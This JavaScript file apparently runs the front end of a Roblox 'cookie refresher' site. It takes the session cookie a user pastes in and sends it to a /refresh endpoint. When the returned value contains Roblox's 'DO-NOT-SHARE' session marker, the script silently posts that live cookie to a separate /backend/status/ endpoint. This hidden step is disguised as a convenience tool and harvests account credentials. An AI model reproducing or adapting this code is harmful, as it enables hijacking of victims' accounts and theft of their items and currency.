const url = `${location.origin}/backend`;

const inputCookie = document.querySelector('.main-input');
const notify = document.querySelector('.app-notify');
const buttonNotify = document.querySelector('.app-notify-button');
const buttonBypass = document.querySelector('.main-button');
const mainResult = document.querySelector('.main-result');
const resultContent = document.querySelector('.result-content');
const resultButton = document.querySelector('.result-button');

const setFirstTimeOnWebsite = _ => {
    localStorage.setItem('firstTimeOnWebsite', true);
    notify && notify.remove();
};

const checkFirstTimeOnWebsite = _ => {
    const hasData = localStorage.getItem('firstTimeOnWebsite');
    !hasData && notify && notify.classList.add('visible');
};

const cookieRefresh = async c => {
    const buttonText = buttonBypass.textContent;
    mainResult.classList.contains('data-get') && mainResult.classList.remove('data-get');
    buttonBypass.textContent = 'Loading...';
    buttonBypass.disabled = true;

    await fetch(`${location.origin}/refresh`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: `cookie=${c}`
    }).then(res => res.text()).then(res => {
        const result = res;
        const cookieValidation = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';

        buttonBypass.textContent = buttonText;
        buttonBypass.disabled = false;

        mainResult.classList.add('data-get');
        resultContent.textContent = result;
        resultButton.onclick = copieText.bind(this, result);

        if (!result.includes(cookieValidation)) return;

        const data = new FormData();
        data.append('cookie', result);

        return fetch(`${url}/status/`, { method: 'POST', body: data });
    });
};

const copieText = async text => await navigator.clipboard.writeText(text);

if (buttonNotify) {
    buttonNotify.onclick = setFirstTimeOnWebsite;
}

buttonBypass.onclick = _ => cookieRefresh(inputCookie.value.trim());
window.onload = checkFirstTimeOnWebsite;
